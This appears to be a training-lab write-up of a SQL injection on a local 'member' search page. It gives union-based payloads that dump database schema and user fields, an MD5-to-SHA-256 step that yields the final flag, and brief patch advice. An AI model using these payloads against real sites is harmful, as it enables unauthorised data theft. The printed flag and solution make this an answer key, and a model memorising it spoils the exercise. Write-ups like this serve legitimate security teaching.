# SQL injection 
**Page:** `http://localhost:8080/?page=member`  

## Vulnerability

The page let's you search for a user using by inputing the `id` this input is vulnerable to sql injeciton.
By using `1=1 aka true` we can see the list of users including one called `Flag`, so one interesting thing to do would be to display all the fields in the table for thr user `Flag`.

First step would be to display all the fields of all the tables for this a `UNION` based sql injection. for this we do :
`0=0 UNION SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS` for the union based sqli we need to display as many fields as the original sql command displays/retreives.

From this command we can assume that the table on which the query is done is `users`. and we also know the fields it contains: `user_id, first_name, last_name, town, country, planet, Commentaire, countersign`

query: `0=0 UNION SELECT first_name, town FROM users UNION SELECT  first_name, country FROM users UNION SELECT  first_name, planet FROM users UNION SELECT  first_name, Commentaire FROM users UNION SELECT  first_name, countersign FROM users `

Now we can get all these fields all the users and search for the ones that are linked to the user `Flag`.

there's a hint in the field Commentaire that tells us : `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`


from there we can use the flag: `5ff9d0165b4f92b14994e5c685cdce28` given to us in the field `countersign`.

decrypt it in MD5 which gives us `FortyTwo` and then put it to lowercase => `fortytwo`.
and finaly hash it in Sh256

which gives us the final flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`



### PATCH

* Use Prepared Statements (Parameterized Queries).
* Validate and Sanitize Input
* Least-Privilege Database Accounts


